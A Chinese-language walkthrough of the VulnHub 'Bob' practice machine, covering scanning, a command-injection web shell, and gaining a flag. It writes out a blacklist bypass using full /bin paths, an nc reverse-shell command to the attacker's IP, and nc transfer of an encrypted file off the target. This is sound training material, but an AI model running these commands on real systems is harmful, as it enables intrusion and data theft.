题记

  

最近在打靶机，发现了一个挺有意思又挺有技巧性的靶机，这里想跟大家分享一下，各位大佬轻喷。

  

环境准备

  

https://download.vulnhub.com/bob/Bob\_v1.0.1.ova (靶机下载地址)  
攻击机 Kali IP 192.168.107.129  
靶机在同一C段下

  

主机发现

  

使用命令nmap -sP 192.168.107.1/24  
192.168.107.1是我物理机的ip，

而192.168.107.254是结束ip。

所以说我们的靶机ip就是192.168.107.132.

  

端口扫描

  

使用命令nmap -sS 192.168.107.132

![](../Images/d04c48f2385ab8b0c6c7bcd2e7e63b3e.png)

我们发现只开放了一个web 80端口，我们访问。  

![](../Images/1a649c196d10338ed8065bcc7a4a4421.png)

上面虽说有Home之类的选项。但是点不动的，没用。所以说web页面上没什么搞头，所以我们从目录下手  

  

目录扫描

  

这里我使用御剑扫描，可以看到，扫出来了robots.txt

![](../Images/a181e0fd05525c695af26d58a7d48c94.png)

访问，看到如下几个根目录。依次访问一下。login.php直接是404。passwords.html是  

![](../Images/f18e5f2143b3dbdb6135b211f1662eec.png)

lat\_memo.html是  

![](../Images/25e11b58cb022e74d779b8a17272f4dc.png)

这两个页面都没什么有用的信息。接下来是dev\_shell.php。这才是本次靶机的突破口。  

![](../Images/91fb329bdcedfbeb475ee71fcb8d12f2.png)

  

寻找突破口

  

一开始，我天真的以为这是一个后面。。。拿起burp就去爆破密码，半天爆不出来。再回头来看，发现有个Output。想一想会不会是一个执行命令的。试一试

![](../Images/2935fc9ff8d8d49f74fd9d14fdb13fd5.png)

果然，执行了命令，当我使用ls时，  

![](../Images/5e9d4d5f62f00ae34068e1b03d16e275.png)

页面没有了回显。于是我推测，应该是ls被禁用了，但是不要忘了，ls还有个加强版的命令(也不能说是加强版，理解意思就行)。lsattr，我们试一试，  

![](../Images/0689c479eb736dafd3a15c1196c350f1.png)

没用过滤，这下可以看到很多有用的东西。比如说这个./dev\_shell\_php.bak，这很明显是个源码泄露，我们把源码DOWN下来。  

![](../Images/550246b88efa2d69db2550d6110e7bc5.png)

看到上面过滤了一些命令，其中包括我们可能用到的ls，nc，cat。 其实这样也可以一步一步进行信息的搜集  

![](../Images/35d2ff1d2c6ea57b264beedb578917e2.png)

但是，每次都要输这么多，显然是很麻烦的。所以我想反弹一个shell到我的攻击机上。但是nc都被禁了，这里用了很多方式，最后发现这种方式能够绕过，直接去/bin里使用命令，比如我使用cat使用命令/bin/cat robots.txt  

![](../Images/a7bb17818037fc18bdbe167ff44cac64.png)

  

获取会话

  

知道怎么绕过nc，接下来就是获得会话了，首先在我的攻击机上使用命令nc -lvp 4444，接着在执行命令界面使用 /bin/nc -e /bin/sh 192.168.107.1 4444。然后，成功获取会话。

![](../Images/d16fa9e05804d54f4113110f156123eb.png)

whoami 可以看到我们目前的权限。为了美化一下界面，产生一个TTY Shell 使用python -c 'import pty;pty.spawn("/bin/bash")'。  

![](../Images/d4c5e2a2b01c4912b86f2b928ff0796c.png)

接着ls看下目录下的文件，有个flag.txt，应该是没权限查看的  

![](../Images/9b9a08c8cc808927ada39ca28b2836d9.png)

  

获得密码

  

进入home目录，查看一下有哪些用户。

![](../Images/0ce0f16f05a718f830389b68590db668.png)

先看bob吧，  

![](../Images/12c7bbd86033fddb8b2a1f4500a3fd71.png)

可以看到两个文件和一个目录，那个login.txt.gpg是gpg加密的，需要密码，所以，现在的目标，就是要搞到密码。同目录下还有个Secret，跟进去看看。  

![](../Images/f0ab6b8bedd46741c8a5712302f72b1e.png)

这个地方，需要有某种常识。。。这个地方也是卡了半天。。  

![](../Images/f34732d66f93d1cac522fc55791cd08e.png)

就是这个，可以发现就是个所谓的“藏头诗”  

![](../Images/53cde18d443f857c1f9d72345091b8de.png)

这也是比较有意思的，不知道确实就真的不知道了。。所以，密码自然就是这个每一句的开头了。然后我们使用命令解密gpg --batch --passphrase HARPOCRATES -d login.txt.gpg。结果还是没法  

![](../Images/f89a6e88f5ec31c1559f37da72406183.png)

这里又卡了半天，我是这样做的👉：用nc将该文件转发到我的攻击机上，再用gpg解密。

先在攻击机上nc -lvp 1235 > login.txt.gpg。意思是接收的文件是login.txt.gpg

在靶机上先切换到/home/bob/Documents下，

接着使用命令nc -w 3 192.168.107.129 1235 < login.txt.gpg。

![](../Images/f3aedd4f85b8885769e1644059456e43.png)

接着ctrl c结束，查看  

![](../Images/b006aad6856de2925d5a8533c525f8a3.png)

已经被转移过来了，然后，再次使用解密命令解密。  

![](../Images/85adac71266116ea803447a9fca4a65d.png)

解密成功。获得了bob的密码。  

  

Get flag

  

登陆bob的账号。su bob。然后我直接sudo cat flag.txt。就得到了flag

![](../Images/74bb28a4e235fab4c99c9a0e15991449.png)
